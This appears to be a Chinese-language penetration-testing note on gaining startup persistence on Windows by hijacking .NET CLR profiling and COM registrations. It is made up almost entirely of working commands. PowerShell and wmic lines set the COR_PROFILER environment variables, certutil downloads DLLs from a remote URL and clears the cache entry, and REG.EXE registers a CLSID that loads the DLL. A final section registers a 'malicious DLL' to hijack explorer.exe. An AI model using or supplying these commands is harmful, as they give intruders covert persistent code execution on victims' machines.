	劫持调用.net程序，开机启动
	https://github.com/3gstudent/CLR-Injection/blob/master/CLR-Injection_x64.bat
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/461.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/462.png)

	WMIC可替换为powershell
	New-ItemProperty "HKCU:\Environment\" COR_ENABLE_PROFILING -value "1" -propertyType string | Out-Null
	New-ItemProperty "HKCU:\Environment\" COR_PROFILER -value "{11111111-1111-1111-1111-111111111111}" -propertyType string | Out-Null

	wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
	wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
	certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
	certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
	certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll
	certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete
	SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
	REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg_x64.dll" /F
	REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 
	SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
	REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
	REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
	添加全局变量
	计算机\HKEY_CURRENT_USER\Environment
	COR_ENABLE_PROFILING=1
	COR_PROFILER={11111111-1111-1111-1111-111111111111}
	注册CLSID
	计算机\HKEY_CURRENT_USER\Software\Classes\CLSID添加项{11111111-1111-1111-1111-111111111111}和它的子项InprocServer32
	新建一个键ThreadingModel，键值为：Apartment，默认键值为dll路径
	劫持explorer.exe
	>SET COR_ENABLE_PROFILING=1
	>SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
	位置(新建)
	HKEY_CURRENT_USER\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32默认值为恶意DLL
	新建ThreadingModel值为Apartment